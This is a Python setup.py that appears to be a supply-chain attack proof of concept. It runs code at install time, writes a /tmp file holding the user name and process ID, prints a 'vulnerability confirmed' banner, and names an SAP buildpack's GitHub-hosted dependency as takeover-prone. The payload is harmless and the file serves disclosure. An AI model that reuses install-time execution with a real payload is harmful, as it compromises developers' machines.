from setuptools import setup
import os
import sys

# ANSI color codes
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
END = '\033[0m'

# Create proof file
pid = os.getpid()
poc_file = f"/tmp/SUPPLY_CHAIN_POC_{pid}.txt"

with open(poc_file, "w") as f:
    f.write("╔══════════════════════════════════════════════════════════╗\n")
    f.write("║           SUPPLY CHAIN ATTACK POC BY TALHAKHAN           ║\n")
    f.write("╚══════════════════════════════════════════════════════════╝\n")
    f.write(f"\n📁 Proof file: {poc_file}\n")
    f.write(f"👤 User: {os.getenv('USER')}\n")
    f.write(f"🔢 PID: {pid}\n")
    f.write(f"🔗 Source: git+https://github.com/TalhaKhan-404/test.git\n")
    f.write("\n" + "─"*60 + "\n")
    f.write("🚨 VULNERABILITY CONFIRMED 🚨\n")
    f.write("─"*60 + "\n")
    f.write("pip install from GitHub = Arbitrary Code Execution\n\n")
    f.write("📦 SAP HANA Buildpack vulnerable:\n")
    f.write("git+https://github.com/alundesap/python-jws.git/#egg=jws\n")
    f.write("\n💥 IMPACT: Repository Takeover → RCE\n")
    f.write("╔══════════════════════════════════════════════════════════╗\n")
    f.write("║                 VULNERABILITY DEMONSTRATED               ║\n")
    f.write("╚══════════════════════════════════════════════════════════╝\n")

# Try to show colorful output
try:
    term = open("/dev/tty", "w")
    
    # Big colorful header
    term.write(f"\n{RED}{'█'*60}{END}\n")
    term.write(f"{BOLD}{RED}{'█'*6} {YELLOW}SUPPLY CHAIN ATTACK POC BY TALHAKHAN {RED}{'█'*6}{END}\n")
    term.write(f"{RED}{'█'*60}{END}\n\n")
    
    term.write(f"{GREEN}✅ Proof file created: {poc_file}{END}\n")
    term.write(f"{CYAN}🔢 Process ID: {pid}{END}\n\n")
    
    term.write(f"{RED}{BOLD}🚨 VULNERABILITY CONFIRMED 🚨{END}\n")
    term.write(f"{YELLOW}📦 pip install from GitHub URL{END}\n")
    term.write(f"{MAGENTA}💥 IMPACT: Repository Takeover → RCE{END}\n\n")
    
    term.write(f"{BLUE}🔗 Same vulnerability in:{END}\n")
    term.write(f"{RED}SAP HANA: git+https://github.com/alundesap/python-jws.git/#egg=jws{END}\n\n")
    
    term.write(f"{RED}{'█'*60}{END}\n")
    term.close()
except:
    # Fallback without colors
    try:
        term = open("/dev/tty", "w")
        term.write("\n" + "█"*60 + "\n")
        term.write("█     SUPPLY CHAIN ATTACK POC BY TALHAKHAN     █\n")
        term.write("█"*60 + "\n")
        term.write(f"\n✅ Proof file: {poc_file}\n")
        term.write(f"🔢 PID: {pid}\n")
        term.write("\n🚨 VULNERABILITY: pip install from GitHub\n")
        term.write("💥 IMPACT: Repository Takeover → RCE\n")
        term.write("█"*60 + "\n")
        term.close()
    except:
        pass

setup(
    name='supply-chain-poc',
    version='0.1.0',
    author='TalhaKhan',
)
